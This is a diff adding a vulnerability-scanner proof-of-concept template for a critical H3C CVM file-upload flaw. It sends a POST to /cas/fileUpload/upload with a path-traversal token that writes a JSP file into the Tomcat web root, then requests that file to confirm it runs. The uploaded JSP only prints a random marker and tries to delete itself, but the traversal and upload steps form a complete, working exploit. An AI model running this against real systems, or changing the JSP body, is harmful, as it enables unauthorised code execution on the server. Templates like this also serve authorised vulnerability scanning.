@@ -1,0 +1,35 @@
+name: poc-yaml-h3c-cvm-upload-file-upload
+binding: 3dad90cb-2418-409f-8a68-bf332fee46c6
+manual: true
+detail:
+    author: xiaobaicai
+    links:
+        - https://planet.vulbox.com/detail/MTE4MDM=
+    vulnerability:
+        id: CT-479112
+        level: critical
+    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
+transport: http
+set:
+    a: randomLowercase(20)
+    b: request.url
+    c: randomLowercase(10)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{c}}.jsp
+            headers:
+                Content-Type: application/x-www-form-urlencoded
+                Content-range: bytes 0-10/20
+                Referer: '{{b}}cas/login'
+            body: <%out.println("{{a}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        expression: response.status == 200 && response.body.bcontains(b"success") && response.headers["Content-Type"].contains("application/json") && response.headers["Server"].contains("H3C-CVM")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /cas/js/lib/buttons/{{c}}.jsp
+        expression: response.status == 200 && response.body.bstartsWith(bytes(a))
+expression: r0() && r1()
